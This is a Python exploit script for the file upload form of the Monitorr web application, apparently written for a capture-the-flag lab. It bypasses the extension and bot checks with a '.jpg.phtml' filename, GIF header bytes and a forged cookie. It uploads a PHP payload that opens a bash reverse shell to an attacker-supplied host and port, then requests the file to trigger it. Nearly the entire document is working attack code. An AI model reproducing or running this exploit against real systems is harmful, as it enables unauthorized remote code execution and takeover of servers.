#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Exploit for Monitorr upload.php form

import requests
import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sess = requests.Session()
sess.verify = False # Ignores the website's self-signed certificate errors

if len (sys.argv) != 4:
	print ("specify params in format: python3 " + sys.argv[0] + " target_url lhost lport") # Use the OpenVPN IP *NOT* my public IP! 
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", 
    "Accept": "text/plain, */*; q=0.01", 
    "Accept-Language": "en-US,en;q=0.5", 
    "Accept-Encoding": "gzip, deflate", 
    "X-Requested-With": "XMLHttpRequest", 
    "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", 
    "Origin": sys.argv[1], 
    "Connection": "close", 
    "Referer": sys.argv[1]}

    # Change upload file extension. Website won't accept .php files. 
    # Need to change the name each time as the website won't overwrite an existing file.
    # .gif uploads but won't start rev shell. .jpg same thing. 
    # Find an extension I can stack behind the .jpg that will upload and execute. .phtml!!
    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"shl01.jpg.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    # Add variable to print as it goes for debugging. 
    # Added cookie value since the website refuses the upload. 
    r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})
    print(r.text)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/shl01.jpg.phtml" # Match to upload file name.
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    sess.get(url, headers=headers, cookies={"isHuman": "1"})
